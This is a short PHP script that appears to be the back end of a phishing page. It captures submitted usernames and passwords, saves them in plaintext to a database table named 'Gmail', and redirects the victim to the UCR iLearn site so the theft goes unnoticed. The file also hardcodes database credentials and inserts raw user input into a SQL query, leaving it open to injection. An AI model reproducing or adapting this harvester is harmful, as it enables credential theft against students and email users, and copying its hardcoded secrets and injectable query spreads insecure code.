<?php 

Header('Location: https://www.ilearn.ucr.edu');

$con = mysqli_connect("localhost","KyleM","Minshall1!","Site");

$username = $_POST['username'];
$password = $_POST['password'];

mysqli_query($con,"INSERT INTO Gmail (Username, Password) VALUES ('$username', '$password')");

mysqli_close($con);

?>